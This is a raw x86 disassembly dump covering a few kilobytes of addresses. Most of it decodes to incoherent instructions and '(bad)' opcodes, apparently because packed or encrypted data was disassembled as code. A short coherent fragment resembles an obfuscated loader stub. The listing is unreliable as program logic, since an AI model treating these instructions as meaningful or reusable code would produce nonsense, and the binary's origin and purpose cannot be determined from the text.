  415d61:	ds hlt 
  415d63:	add    al,0x3d
  415d65:	in     eax,dx
  415d66:	dec    ecx
  415d67:	push   es
  415d68:	loope  0x415d4e
  415d6a:	ss gs sbb al,0xf8
  415d6e:	push   esp
  415d6f:	mov    esi,0x3d2f21f9
  415d74:	fcmove st,st(4)
  415d76:	xor    dl,BYTE PTR [eax-0x5e2701c4]
  415d7c:	repnz mov al,ds:0x880de62f
  415d82:	or     eax,0x4fde6ee4
  415d87:	fld    QWORD PTR [edi+0x6a132aa0]
  415d8d:	mov    ds:0x7062d99d,al
  415d92:	sbb    eax,0xecb67a26
  415d97:	xchg   esi,eax
  415d98:	inc    ecx
  415d99:	push   eax
  415d9a:	sar    DWORD PTR [ebx-0x5c],cl
  415d9d:	int    0xd4
  415d9f:	jg     0x415dbd
  415da1:	loop   0x415dc3
  415da3:	cdq    
  415da4:	(bad)  
  415da6:	(bad)  
  415da7:	bound  ebx,QWORD PTR [ecx+0x5a]
  415daa:	inc    ebp
  415dab:	fst    QWORD PTR [esi+0x709e3101]
  415db1:	loope  0x415de4
  415db3:	stos   BYTE PTR es:[edi],al
  415db4:	test   al,0x84
  415db6:	inc    edi
  415db7:	out    0x96,al
  415db9:	loop   0x415db0
  415dbb:	jg     0x415d72
  415dbd:	test   eax,0x32a467f6
  415dc2:	ss push ss
  415dc4:	daa    
  415dc5:	loop   0x415d4b
  415dc7:	jecxz  0x415ddc
  415dc9:	dec    eax
  415dca:	loope  0x415d60
  415dcc:	inc    ecx
  415dcd:	lods   al,BYTE PTR ds:[esi]
  415dce:	movups XMMWORD PTR [ebx-0x2bc39ba7],xmm7
  415dd5:	mov    dl,0x8
  415dd7:	and    BYTE PTR [ecx],ah
  415dd9:	dec    esi
  415dda:	sbb    eax,DWORD PTR [edi+0x47]
  415ddd:	or     eax,0x602abc5e
  415de2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de3:	mov    ebp,0xbdb6b935
  415de8:	mov    ds:0x44aa323c,eax
  415ded:	jmp    0x415df1
  415def:	push   ss
  415df0:	mov    WORD PTR [ecx+0x344b4b8f],gs
  415df6:	sub    eax,0xb6fb3d63
  415dfb:	jo     0x415e33
  415dfd:	xor    BYTE PTR [eax-0x52a19360],dl
  415e03:	xor    BYTE PTR [eax-0x2fade84e],0xad
  415e0a:	sub    edx,DWORD PTR gs:[ebp+0x13118de8]
  415e11:	add    bl,0xaf
  415e14:	push   esi
  415e15:	xor    ah,BYTE PTR ds:0xb1d7c84c
  415e1b:	push   0x61
  415e1d:	inc    esi
  415e1e:	in     al,0x98
  415e20:	shl    BYTE PTR [esi],0xa
  415e23:	push   esp
  415e24:	jmp    0x415da8
  415e26:	add    esp,DWORD PTR [ebx+0x2f316220]
  415e2c:	xchg   ecx,eax
  415e2d:	push   es
  415e2e:	mov    BYTE PTR [esi],bl
  415e30:	lahf   
  415e31:	mul    BYTE PTR [edx+0x57]
  415e34:	and    eax,0xfcb25aa8
  415e39:	sbb    esi,ebp
  415e3b:	jne    0x415eb5
  415e3d:	mov    ds:0x4cb99d21,eax
  415e42:	sub    DWORD PTR [ecx+0x63],ecx
  415e45:	or     al,0x9e
  415e47:	in     eax,dx
  415e48:	jl     0x415e40
  415e4a:	retf   
  415e4b:	mov    BYTE PTR [ebp+ebx*8-0x22a3b494],dl
  415e52:	shr    BYTE PTR [ebp-0x32],cl
  415e55:	ss inc ebx
  415e57:	ret    0x79b3
  415e5a:	mov    ecx,0xe214e5d7
  415e5f:	jno    0x415e59
  415e61:	jl     0x415e01
  415e63:	push   edx
  415e64:	or     eax,0x3dd4f991
  415e69:	aas    
  415e6a:	out    0x7e,al
  415e6c:	leave  
  415e6d:	sub    cl,BYTE PTR [ecx+0x32]
  415e70:	clc    
  415e71:	xor    esp,DWORD PTR [edx+0x4b0d83e3]
  415e77:	add    ebp,eax
  415e79:	inc    eax
  415e7a:	push   ebp
  415e7b:	push   ebx
  415e7c:	clc    
  415e7d:	mov    DWORD PTR [edi],esp
  415e7f:	daa    
  415e80:	mov    ?,WORD PTR [eax-0x3d]
  415e83:	sbb    DWORD PTR [edx-0x463dfea9],edx
  415e89:	sbb    eax,DWORD PTR [ecx]
  415e8b:	ins    DWORD PTR es:[edi],dx
  415e8c:	aaa    
  415e8d:	adc    ch,BYTE PTR ds:0xdc674b93
  415e93:	sub    edi,DWORD PTR [eax-0x3b15e1bb]
  415e99:	das    
  415e9a:	pop    esp
  415e9b:	and    DWORD PTR [edi],0xffffffb8
  415e9e:	push   0x9d4504a6
  415ea3:	fimul  DWORD PTR [edi+0x2a]
  415ea6:	fucomi st,st(5)
  415ea8:	add    BYTE PTR [edx-0x53755aa6],ah
  415eae:	add    ebx,eax
  415eb0:	cwde   
  415eb1:	and    BYTE PTR [ecx+eiz*2],al
  415eb4:	mov    cl,0x6c
  415eb6:	outs   dx,DWORD PTR ds:[esi]
  415eb7:	and    al,BYTE PTR [esi]
  415eb9:	mov    ch,0xc8
  415ebb:	shl    BYTE PTR [ebx-0x3a7ca18a],0xbb
  415ec2:	enter  0x72f3,0x31
  415ec6:	mov    ah,0xb5
  415ec8:	out    0xd2,eax
  415eca:	push   eax
  415ecb:	in     al,0x7e
  415ecd:	js     0x415ec7
  415ecf:	sbb    BYTE PTR [edx-0x677a8bf4],0x81
  415ed6:	daa    
  415ed7:	jnp    0x415ee4
  415ed9:	sub    al,0x4d
  415edb:	(bad)  
  415edc:	mov    dl,0x9f
  415ede:	cs cdq 
  415ee0:	imul   eax,DWORD PTR [ebx],0x4c
  415ee3:	xchg   DWORD PTR [ebx],edi
  415ee5:	test   eax,0xc216981c
  415eea:	rcr    ebx,cl
  415eec:	jnp    0x415e83
  415eee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eef:	and    DWORD PTR [esi],ebp
  415ef1:	fsub   QWORD PTR [eax]
  415ef3:	xchg   ebp,eax
  415ef4:	neg    edi
  415ef6:	fbstp  TBYTE PTR [ebp+0x1e]
  415ef9:	or     BYTE PTR [ecx+esi*2+0x41cd10f9],0xad
  415f01:	jae    0x415e87
  415f03:	arpl   WORD PTR [ebx],si
  415f05:	sub    BYTE PTR [ebp+0x23],bh
  415f08:	daa    
  415f09:	shl    DWORD PTR [edx-0x47],cl
  415f0c:	adc    eax,0x74825587
  415f11:	push   ebp
  415f12:	(bad)  
  415f14:	pushf  
  415f15:	icebp  
  415f16:	or     dh,BYTE PTR [eax+0x7]
  415f19:	push   esp
  415f1a:	mov    ah,0x2e
  415f1c:	pop    ecx
  415f1d:	in     al,dx
  415f1e:	or     DWORD PTR [ebx-0x4feee47f],0x32
  415f25:	mov    dl,0xa3
  415f27:	popf   
  415f28:	test   BYTE PTR [ecx-0x37e87307],bh
  415f2e:	and    bl,0xc9
  415f31:	dec    edx
  415f32:	scas   al,BYTE PTR es:[edi]
  415f33:	rcl    DWORD PTR [ebp+0x1cab642d],cl
  415f39:	popa   
  415f3a:	inc    edx
  415f3b:	sbb    eax,0x976b0d97
  415f40:	outs   dx,DWORD PTR ds:[esi]
  415f41:	mov    ds:0xb11c44e9,eax
  415f46:	mov    DWORD PTR [eax-0x4f88bb14],esp
  415f4c:	adc    eax,0x6f096b1d
  415f51:	fcmovne st,st(2)
  415f53:	ja     0x415f72
  415f55:	repz mov esp,0xfe2478d0
  415f5b:	pushf  
  415f5c:	or     al,0x7d
  415f5e:	rol    DWORD PTR [edi+0x960c22e],1
  415f64:	dec    ecx
  415f65:	jb     0x415fd7
  415f67:	dec    ebp
  415f68:	mov    dl,0xa8
  415f6a:	mov    ch,0xdd
  415f6c:	jne    0x415f51
  415f6e:	mov    ah,0xf3
  415f70:	pop    eax
  415f71:	and    cl,bl
  415f73:	sub    bl,BYTE PTR [edi]
  415f75:	fdiv   DWORD PTR [edi+eax*1]
  415f78:	lds    eax,FWORD PTR ds:0xe907a60c
  415f7e:	hlt    
  415f7f:	shl    BYTE PTR ds:0x3424462c,1
  415f85:	xchg   ebp,eax
  415f86:	test   al,0x95
  415f88:	leave  
  415f89:	sbb    ebx,DWORD PTR [edx]
  415f8b:	mov    BYTE PTR [ebx],dh
  415f8d:	mov    ebp,0x9c29b0bd
  415f92:	xchg   esi,eax
  415f93:	jle    0x415f1a
  415f95:	fstp   st(5)
  415f97:	and    esi,0x35
  415f9a:	pop    ds
  415f9b:	rol    ebx,1
  415f9d:	out    0xcd,eax
  415f9f:	scas   al,BYTE PTR es:[edi]
  415fa0:	inc    ebp
  415fa1:	retf   
  415fa2:	mov    ebx,0xdee79202
  415fa7:	mov    ds:0x92ce1df8,eax
  415fac:	mov    ebp,DWORD PTR [ecx]
  415fae:	rol    ah,cl
  415fb0:	push   esp
  415fb1:	push   cs
  415fb2:	addr16 out 0x63,eax
  415fb5:	fmulp  st(0),st
  415fb7:	ret    0x5a2
  415fba:	ficomp DWORD PTR [ebx-0x77]
  415fbd:	add    DWORD PTR [ebx-0x29641d0],0xffffff88
  415fc4:	(bad)  [edi+eiz*2+0x51]
  415fc8:	and    eax,0x37f9e6b8
  415fcd:	inc    esi
  415fce:	(bad)  
  415fcf:	dec    edx
  415fd0:	hlt    
  415fd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415fd2:	repnz push eax
  415fd4:	cmp    DWORD PTR [edx],esp
  415fd6:	hlt    
  415fd7:	inc    edx
  415fd8:	jns    0x416044
  415fda:	or     DWORD PTR [eax-0x5110a30a],esp
  415fe0:	lock jno 0x415fe1
  415fe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fe4:	inc    esi
  415fe5:	iret   
  415fe6:	scas   al,BYTE PTR es:[edi]
  415fe7:	push   es
  415fe8:	sahf   
  415fe9:	cmp    DWORD PTR [ecx+0x497aa4b6],ebx
  415fef:	xor    BYTE PTR [edx],al
  415ff1:	xor    cl,BYTE PTR [edx+0x52]
  415ff4:	jno    0x415f8f
  415ff6:	add    al,0xa3
  415ff8:	test   al,0x7b
  415ffa:	push   cs
  415ffb:	mov    WORD PTR [edi+0x78bcb21d],es
  416001:	jmp    0x89d3:0x33f366fb
  416008:	push   ebp
  416009:	mov    al,0x8b
  41600b:	push   ebp
  41600c:	or     BYTE PTR [ebx-0x28fc4ba3],cl
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0xca18ea97
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	bound  ebp,QWORD PTR [edi+esi*4]
  41605e:	shr    DWORD PTR [ebx],0xf2
  416061:	dec    esp
  416062:	xchg   DWORD PTR [ebx+0x3343108b],edi
  416068:	mov    ds:0xaf84ccd1,eax
  41606d:	xor    al,0x7b
  41606f:	cmp    al,0x26
  416071:	cmp    BYTE PTR [eax+0x65ec487e],0x25
  416078:	xor    al,0xf0
  41607a:	into   
  41607b:	sub    BYTE PTR [esi+0x65],al
  41607e:	mov    eax,0xc898f930
  416083:	dec    esp
  416084:	adc    DWORD PTR [edx-0x8],edx
  416087:	mov    ds:0x673229fd,al
  41608c:	or     DWORD PTR [ebx],ebx
  41608e:	xchg   al,ah
  416090:	lea    edi,[esi]
  416092:	retf   
  416093:	ss iret 
  416095:	in     eax,dx
  416096:	mov    ds:0x4987e617,eax
  41609b:	sbb    BYTE PTR [ebp-0x64],0x5f
  41609f:	xchg   edi,eax
  4160a0:	js     0x416103
  4160a2:	mov    ds:0xfb76739e,eax
  4160a7:	out    dx,al
  4160a8:	into   
  4160a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160aa:	lea    esp,[ebp+ebp*4+0x5f04cc46]
  4160b1:	(bad)  
  4160b2:	cmp    eax,0x148555bb
  4160b7:	xor    bh,BYTE PTR [ebx+0x32]
  4160ba:	pop    esi
  4160bb:	mov    ds:0xa4ed015f,eax
  4160c0:	je     0x416060
  4160c2:	loop   0x416141
  4160c4:	inc    ebp
  4160c5:	or     al,0x53
  4160c7:	pusha  
  4160c8:	lock shl BYTE PTR fs:[ebx],1
  4160cc:	ds adc eax,ebp
  4160cf:	ja     0x4160ea
  4160d1:	fnstenv [edx+ebp*8+0x54]
  4160d5:	mov    ebx,ecx
  4160d7:	or     edi,DWORD PTR [ecx+0x51]
  4160da:	ret    0x9283
  4160dd:	adc    BYTE PTR [ecx],dh
  4160df:	add    DWORD PTR [ebx],ebx
  4160e1:	(bad)  
  4160e2:	mov    ds:0xbcdae4a0,eax
  4160e7:	mov    dl,BYTE PTR [esp+edi*4-0x72]
  4160eb:	jp     0x416120
  4160ed:	xor    al,0x13
  4160ef:	das    
  4160f0:	sbb    BYTE PTR [esi-0x34],dl
  4160f3:	lock cmp BYTE PTR [edx+0x7ed9c1b7],cl
  4160fa:	xchg   esi,eax
  4160fb:	sahf   
  4160fc:	mov    dh,0x68
  4160fe:	(bad)  
  4160ff:	cmc    
  416100:	or     ch,BYTE PTR [ebp+0x58]
  416103:	mov    DWORD PTR [edx+0x291f57ed],ebp
  416109:	gs scas al,BYTE PTR es:[edi]
  41610b:	dec    esp
  41610c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41610d:	in     eax,dx
  41610e:	retf   
  41610f:	push   edx
  416110:	in     al,dx
  416111:	mov    bl,0x1a
  416113:	scas   al,BYTE PTR es:[edi]
  416114:	dec    edi
  416115:	arpl   WORD PTR [ecx-0x24bee894],dx
  41611b:	(bad)  
  41611c:	out    dx,al
  41611d:	out    0x9f,eax
  41611f:	jmp    FWORD PTR [ebx-0x25a9e6c5]
  416125:	and    bl,BYTE PTR [edi]
  416127:	xchg   BYTE PTR [esi+0x3b],bh
  41612a:	cmp    al,0xf9
  41612c:	pop    edx
  41612d:	adc    al,0xbd
  41612f:	(bad)  
  416130:	adc    DWORD PTR [ecx-0x3bdec8d2],eax
  416136:	loope  0x416157
  416138:	push   ds
  416139:	enter  0x66b,0xea
  41613d:	sti    
  41613e:	cmp    eax,0x5dc8cf58
  416143:	and    al,0xe2
  416145:	cmp    BYTE PTR [ecx],dl
  416147:	sahf   
  416148:	sbb    al,0xec
  41614a:	cld    
  41614b:	jne    0x416108
  41614d:	mov    WORD PTR [eax+0x66],es
  416150:	mov    WORD PTR [eax],gs
  416152:	inc    ecx
  416153:	adc    eax,0x96b2a713
  416158:	mov    esp,0xc34d0033
  41615d:	inc    ebx
  41615e:	daa    
  41615f:	arpl   WORD PTR [ebx],bp
  416161:	std    
  416162:	mov    bl,0x3e
  416164:	rcl    BYTE PTR [esi],1
  416166:	icebp  
  416167:	add    BYTE PTR ds:0xa8b5db77,0x2c
  41616e:	mov    ebx,0xd7101d24
  416173:	and    dh,BYTE PTR [edx]
  416175:	iret   
  416176:	js     0x416133
  416178:	inc    edi
  416179:	mov    dl,dl
  41617b:	and    esi,DWORD PTR [ecx+0x14]
  41617e:	mov    ds,WORD PTR ds:0xc048d4a0
  416184:	lock int3 
  416186:	mov    ebp,0x490eca07
  41618b:	add    bh,BYTE PTR [edi-0xa02b551]
  416191:	jnp    0x4161d2
  416193:	cmc    
  416194:	mov    ch,0x62
  416196:	fstp   QWORD PTR [ebx+0x70]
  416199:	les    ecx,FWORD PTR [edx-0x79ce80c]
  41619f:	xchg   ebp,edi
  4161a1:	pop    ss
  4161a2:	mov    esp,DWORD PTR [edi]
  4161a4:	jecxz  0x416224
  4161a6:	retf   0xeee8
  4161a9:	repnz mov esp,0x74f5f267
  4161af:	dec    eax
  4161b0:	shl    esp,cl
  4161b2:	sbb    esp,DWORD PTR [edx-0xa]
  4161b5:	inc    eax
  4161b6:	je     0x416212
  4161b8:	push   ss
  4161b9:	test   BYTE PTR [edx+0xa],dh
  4161bc:	ins    BYTE PTR es:[edi],dx
  4161bd:	sub    al,0xe0
  4161bf:	jo     0x4161c2
  4161c1:	std    
  4161c2:	xlat   BYTE PTR ds:[ebx]
  4161c3:	stos   DWORD PTR es:[edi],eax
  4161c4:	daa    
  4161c5:	aaa    
  4161c6:	fdivr  QWORD PTR [esi]
  4161c8:	mov    esp,0x9b2d6cc6
  4161cd:	into   
  4161ce:	add    eax,0x7b22a20c
  4161d3:	push   eax
  4161d4:	mov    BYTE PTR ds:0x5f3c0c55,dh
  4161da:	bound  edx,QWORD PTR [ecx]
  4161dc:	bound  edx,QWORD PTR [edx+0x16]
  4161df:	pusha  
  4161e0:	arpl   WORD PTR [ebx+eiz*2+0x7cb3989d],bx
  4161e7:	out    0xcc,eax
  4161e9:	test   DWORD PTR ds:0x427e6dcc,0x43ba9b02
  4161f3:	(bad)  
  4161f4:	std    
  4161f5:	arpl   WORD PTR [edx-0x6f32f7a7],di
  4161fb:	jp     0x4161d8
  4161fd:	jmp    0x4161f9
  4161ff:	pop    eax
  416200:	cdq    
  416201:	push   cs
  416202:	imul   DWORD PTR [edi]
  416204:	push   0x57
  416206:	jbe    0x416270
  416208:	pop    ax
  41620a:	loopne 0x416232
  41620c:	jo     0x41625a
  41620e:	xor    BYTE PTR ds:0xabcee07c,ah
  416214:	jnp    0x416283
  416216:	pop    ecx
  416217:	lahf   
  416218:	addr16 out 0x45,eax
  41621b:	enter  0x9b58,0xef
  41621f:	xor    eax,edi
  416221:	daa    
  416222:	fiadd  WORD PTR [edx*8+0x31a301dc]
  416229:	mov    eax,0x4b8287f8
  41622e:	mov    ch,0xf1
  416230:	mov    ebp,0xd732e187
  416235:	mov    al,0x1a
  416237:	adc    eax,0x84ca2684
  41623c:	mov    ah,0x44
  41623e:	mov    bh,0x94
  416240:	xchg   edx,edx
  416242:	pop    esi
  416243:	icebp  
  416244:	jg     0x416242
  416246:	lahf   
  416247:	xor    al,0xce
  416249:	iret   
  41624a:	xchg   esp,edx
  41624c:	mov    ch,0x8
  41624e:	fnstenv [ebp-0xc005f61]
  416254:	in     al,dx
  416255:	mov    es,WORD PTR ds:0x271b1c94
  41625b:	xchg   ebx,eax
  41625c:	retf   0x1e7
  41625f:	fsub   st,st(2)
  416261:	fs scas al,BYTE PTR es:[edi]
  416263:	es mov ebx,0x982e53c1
  416269:	xor    eax,0x19e444d8
  41626e:	ret    0x3621
  416271:	test   DWORD PTR [edx+eax*8],edx
  416274:	mov    dh,BYTE PTR [esp+ebx*4]
  416277:	jecxz  0x41621b
  416279:	int    0xad
  41627b:	ds xchg edx,eax
  41627d:	aad    0x57
  41627f:	cmp    BYTE PTR [edi-0x58],0xc0
  416283:	xchg   BYTE PTR [edx+0x27],bh
  416286:	xchg   esi,eax
  416287:	repz jp 0x416254
  41628a:	pusha  
  41628b:	mov    edi,0x9fcdf0c5
  416290:	push   0x37b038bd
  416295:	add    BYTE PTR [eax+0x68afa4f7],ah
  41629b:	outs   dx,DWORD PTR ds:[esi]
  41629c:	pop    edx
  41629d:	mov    eax,0xfae66fa7
  4162a2:	lods   al,BYTE PTR ds:[esi]
  4162a3:	lea    ecx,[ebx-0x59ca4626]
  4162a9:	adc    eax,0x41bd9f82
  4162ae:	fist   WORD PTR [ebp+0x6ab4e1f6]
  4162b4:	inc    ebx
  4162b5:	inc    ecx
  4162b6:	fisubr WORD PTR [edx]
  4162b8:	cmp    bl,dh
  4162ba:	aaa    
  4162bb:	or     edi,esp
  4162bd:	cdq    
  4162be:	pop    ebx
  4162bf:	popf   
  4162c0:	push   esi
  4162c1:	test   eax,0x8c0f10fe
  4162c6:	ss inc ebx
  4162c8:	shl    BYTE PTR [ebx+0x157f9afa],1
  4162ce:	mov    DWORD PTR [edi-0x75],esp
  4162d1:	call   0x344b:0xaec8278c
  4162d8:	das    
  4162d9:	lods   eax,DWORD PTR ds:[esi]
  4162da:	icebp  
  4162db:	mov    eax,ds:0x204359bd
  4162e0:	or     DWORD PTR [bx-0x7706],0x3d
  4162e6:	mov    dl,bh
  4162e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162e9:	xor    DWORD PTR [ebx],ecx
  4162eb:	bound  ebp,QWORD PTR [ecx+0x5a]
  4162ee:	mov    esi,0x5f0c250e
  4162f3:	sbb    al,0x1c
  4162f5:	xchg   ebp,eax
  4162f6:	ja     0x4162d4
  4162f8:	mov    ebx,0xaf649128
  4162fd:	call   0x3ac5:0x8e3911
  416304:	adc    DWORD PTR [esi-0x13280ed0],ebp
  41630a:	sbb    eax,0x61330e6e
  41630f:	cmp    BYTE PTR [edi+eiz*2+0x6f894a37],bl
  416316:	xchg   edi,eax
  416317:	lahf   
  416318:	xchg   esi,eax
  416319:	sub    ebx,DWORD PTR [edi-0x272deca7]
  41631f:	fwait
  416320:	popf   
  416321:	iret   
  416322:	inc    edi
  416323:	ds pop ebp
  416325:	mov    bl,0xda
  416327:	les    esp,FWORD PTR [eax+0x7]
  41632a:	mov    edx,0x54587a97
  41632f:	jae    0x4162d1
  416331:	les    ecx,FWORD PTR [ecx]
  416333:	in     al,0xe9
  416335:	push   es
  416336:	xchg   esi,eax
  416337:	aaa    
  416338:	data16 std 
  41633a:	and    ebp,ebx
  41633c:	dec    ecx
  41633d:	pop    eax
  41633e:	mov    ds:0xd546cd80,al
  416343:	adc    eax,0x89c29151
  416348:	ins    BYTE PTR es:[edi],dx
  416349:	ficomp WORD PTR [eax+ecx*1+0x2b]
  41634d:	sbb    BYTE PTR [ebx+edi*8+0x79],0x88
  416352:	adc    esp,edx
  416354:	jo     0x416346
  416356:	push   edi
  416357:	xor    DWORD PTR [ebx+0x6c],edx
  41635a:	xor    eax,0x9352747b
  41635f:	dec    edx
  416360:	cdq    
  416361:	pop    edi
  416362:	cmc    
  416363:	push   ebp
  416364:	xchg   BYTE PTR [eax],ch
  416366:	fnsave gs:[edx-0x6d36f405]
  41636d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41636e:	cmp    cl,BYTE PTR [edi-0x20]
  416371:	mov    ecx,ebp
  416373:	sub    bh,BYTE PTR [eax]
  416375:	push   cs
  416376:	mov    eax,0xe19f51b
  41637b:	lods   eax,DWORD PTR ds:[esi]
  41637c:	stos   DWORD PTR es:[edi],eax
  41637d:	adc    DWORD PTR [esi+0x38],ebx
  416380:	stc    
  416381:	mov    bh,0xba
  416383:	jl     0x416382
  416385:	inc    eax
  416386:	(bad)  
  416387:	retf   
  416388:	xchg   edx,eax
  416389:	pop    es
  41638a:	inc    eax
  41638b:	mov    ds:0xbd056b88,al
  416390:	and    DWORD PTR [ecx+0xe],0xa164d39e
  416397:	mov    eax,DWORD PTR [ecx-0x2f]
  41639a:	pusha  
  41639b:	ins    DWORD PTR es:[edi],dx
  41639c:	jp     0x41639e
  41639e:	inc    ebp
  41639f:	dec    ebp
  4163a0:	lods   eax,DWORD PTR ds:[esi]
  4163a1:	jnp    0x4163b9
  4163a3:	bound  edx,QWORD PTR [ebx-0x4689496f]
  4163a9:	cmp    DWORD PTR fs:[ecx],esi
  4163ac:	icebp  
  4163ad:	aas    
  4163ae:	test   al,0x98
  4163b0:	in     al,dx
  4163b1:	stc    
  4163b2:	lock push 0xffffffd1
  4163b5:	loope  0x4163a4
  4163b7:	cli    
  4163b8:	push   ecx
  4163b9:	hlt    
  4163ba:	inc    ecx
  4163bb:	jns    0x4163b1
  4163bd:	or     esi,ebx
  4163bf:	sub    esi,DWORD PTR [edi+ebx*4-0x6c]
  4163c3:	cmp    BYTE PTR [esi+0x6194ba1a],ch
  4163c9:	mov    edx,0x6e5e27f7
  4163ce:	or     ebp,DWORD PTR fs:[edi+0xb]
  4163d2:	ds jne 0x4163c9
  4163d5:	mov    esi,0xacb525e7
  4163da:	ins    DWORD PTR es:[edi],dx
  4163db:	and    BYTE PTR [eax+0x41b008b6],0xba
  4163e2:	push   ecx
  4163e3:	mov    al,ds:0xa34ab992
  4163e9:	std    
  4163ea:	repz dec esp
  4163ec:	xchg   esi,eax
  4163ed:	push   0xa7f0b292
  4163f2:	xchg   esi,eax
  4163f3:	jmp    DWORD PTR [edi-0x54]
  4163f6:	test   al,0x73
  4163f8:	pop    esi
  4163f9:	push   ecx
  4163fa:	and    BYTE PTR [edx-0x1886d257],dh
  416400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416401:	in     al,dx
  416402:	push   cs
  416403:	xchg   ecx,eax
  416404:	test   DWORD PTR [edi+ebp*1-0x4],0x58d74a3f
  41640c:	jb     0x4163e4
  41640e:	sbb    DWORD PTR [ecx+edx*8+0x109f52e2],ebx
  416415:	jle    0x416413
  416417:	dec    esi
  416418:	jne    0x41645c
  41641a:	jae    0x4163b0
  41641c:	jg     0x416421
  41641e:	fnsave [ecx]
  416420:	shl    BYTE PTR [eax],0x6a
  416423:	mov    ecx,0x94bc5672
  416428:	inc    ebx
  416429:	sub    al,0x4e
  41642b:	std    
  41642c:	or     DWORD PTR [ebp+0x37a8f78f],ebx
  416432:	gs push es
  416434:	pop    ds
  416435:	rol    DWORD PTR ds:0xf3d694b9,cl
  41643b:	or     al,0xd6
  41643d:	adc    DWORD PTR [eax+0x25],eax
  416440:	sub    al,0x19
  416442:	out    0x5c,eax
  416444:	jnp    0x41648e
  416446:	mov    al,al
  416448:	add    DWORD PTR [ebx+0x24c5aa74],ebp
  41644e:	or     eax,DWORD PTR [ecx+0x34]
  416451:	std    
  416452:	outs   dx,DWORD PTR ds:[esi]
  416453:	js     0x416462
  416455:	mov    ebp,0x4780c077
  41645a:	fnstenv [edi-0x6a]
  41645d:	push   edi
  41645e:	sbb    esi,DWORD PTR [edi]
  416460:	test   al,0xb8
  416462:	fnstsw WORD PTR [ecx]
  416464:	push   edx
  416465:	pusha  
  416466:	inc    ebp
  416467:	fwait
  416468:	daa    
  416469:	xchg   ecx,eax
  41646a:	bound  esp,QWORD PTR [esi-0x5a]
  41646d:	fistp  WORD PTR [eax-0x5d]
  416470:	or     bl,bh
  416472:	jp     0x4163f8
  416474:	push   edx
  416475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416476:	xlat   BYTE PTR ds:[ebx]
  416477:	adc    eax,0xaf87e877
  41647c:	mov    dl,BYTE PTR fs:[ecx+0x78]
  416480:	sbb    al,ah
  416482:	sti    
  416483:	dec    ecx
  416484:	cmp    BYTE PTR [edi],ah
  416486:	not    esi
  416488:	(bad)  
  41648a:	or     bl,BYTE PTR ds:0x5e197f53
  416490:	clc    
  416491:	xlat   BYTE PTR ds:[ebx]
  416492:	ins    DWORD PTR es:[edi],dx
  416493:	and    BYTE PTR [ecx+0x1e],0xfb
  416497:	xor    ch,BYTE PTR [eax+eax*8-0x7532bdf2]
  41649e:	(bad)  
  4164a0:	fnstsw WORD PTR [eax-0x3]
  4164a3:	dec    esi
  4164a4:	inc    BYTE PTR [ebp+eax*1+0x41363399]
  4164ab:	add    DWORD PTR [esi+0x6a],eax
  4164ae:	ds mov dh,0x80
  4164b1:	in     al,0xe9
  4164b3:	push   edx
  4164b4:	sbb    BYTE PTR cs:[edx+ecx*8+0x2d],cl
  4164b9:	pop    esi
  4164ba:	xor    DWORD PTR gs:[ebx],eax
  4164bd:	push   ss
  4164be:	mov    DWORD PTR [edx],ebx
  4164c0:	dec    esi
  4164c1:	jae    0x416515
  4164c3:	xchg   BYTE PTR [edx],bl
  4164c5:	pop    esi
  4164c6:	push   ebx
  4164c7:	ins    BYTE PTR es:[edi],dx
  4164c8:	ret    0x394e
  4164cb:	mov    bh,0xf7
  4164cd:	sub    DWORD PTR [edx+eax*8-0x35],0xffffffa6
  4164d2:	sub    ah,ah
  4164d4:	or     DWORD PTR [ebx],ecx
  4164d6:	mov    edi,0x5c0afbfc
  4164db:	cmp    BYTE PTR [ebp-0x24],0x91
  4164df:	add    DWORD PTR [esi-0x3f],ecx
  4164e2:	xor    DWORD PTR [eax+esi*1-0x50],edi
  4164e6:	xchg   BYTE PTR [edx],ch
  4164e8:	(bad)  
  4164e9:	adc    BYTE PTR fs:[edx],0x23
  4164ed:	loopne 0x4164d4
  4164ef:	mov    ds,WORD PTR [edi+0x7d586cb8]
  4164f5:	pop    es
  4164f6:	clc    
  4164f7:	out    dx,eax
  4164f8:	test   al,0xbe
  4164fa:	add    eax,0x6b4ad7db
  4164ff:	fdivr  DWORD PTR [ebx]
  416501:	call   0xd17d8752
  416506:	mov    eax,ds:0xe4d9204e
  41650b:	cmp    al,0x2f
  41650d:	lahf   
  41650e:	sbb    BYTE PTR [eax],bh
  416510:	inc    edi
  416511:	icebp  
  416512:	rol    BYTE PTR [ebp+ecx*1+0x43],0xea
  416517:	gs push ds
  416519:	adc    ebp,ecx
  41651b:	sbb    al,BYTE PTR [ebx]
  41651d:	jno    0x4164f7
  41651f:	jmp    0x1da1d7e
  416524:	in     eax,0x59
  416526:	loop   0x416518
  416528:	push   edi
  416529:	inc    edx
  41652a:	add    ecx,DWORD PTR [ebx+0x1]
  41652d:	sub    ch,al
  41652f:	xchg   DWORD PTR [ecx+0x20bfc418],edi
  416535:	fsubr  QWORD PTR [edi+0x1a]
  416538:	cmp    dh,BYTE PTR ss:[ebx]
  41653b:	out    dx,eax
